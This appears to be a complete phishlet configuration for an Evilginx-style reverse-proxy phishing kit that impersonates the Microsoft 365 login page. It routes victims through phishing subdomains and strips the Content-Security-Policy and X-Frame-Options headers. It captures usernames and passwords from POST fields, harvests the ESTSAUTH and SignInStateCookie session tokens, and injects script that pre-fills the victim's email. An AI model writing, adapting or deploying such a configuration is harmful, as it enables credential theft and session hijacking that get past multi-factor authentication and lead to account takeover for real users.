name: 'microsoft'
min_ver: '3.0.0'
author: 'authflow'
description: 'Microsoft 365 login with auto-fill email capture'

proxy_hosts:
  - {phish_sub: 'SUB2_PLACEHOLDER', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'SUB2_PLACEHOLDER', orig_sub: 'login.microsoftonline.com', domain: 'microsoftonline.com', session: true}

sub_filters:
  - {trg: 'login.microsoftonline.com', orig: 'login.microsoftonline.com', repl: 'SUB2_PLACEHOLDER.{hostname}'}
  - {trg: 'Content-Security-Policy', orig: '.*', repl: '', search: '.*', type: 'header'}
  - {trg: 'X-Frame-Options', orig: '.*', repl: '', search: '.*', type: 'header'}

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/'

js_inject:
  - trigger: 'login.microsoftonline.com'
    code: |
      (function() {
        var urlParams = new URLSearchParams(window.location.search);
        var email = urlParams.get('email');
        if (email) {
          var emailField = document.querySelector('input[name="login"]') || document.querySelector('input[type="email"]');
          if (emailField) {
            emailField.value = email;
            emailField.dispatchEvent(new Event('input', { bubbles: true }));
          }
        }
      })();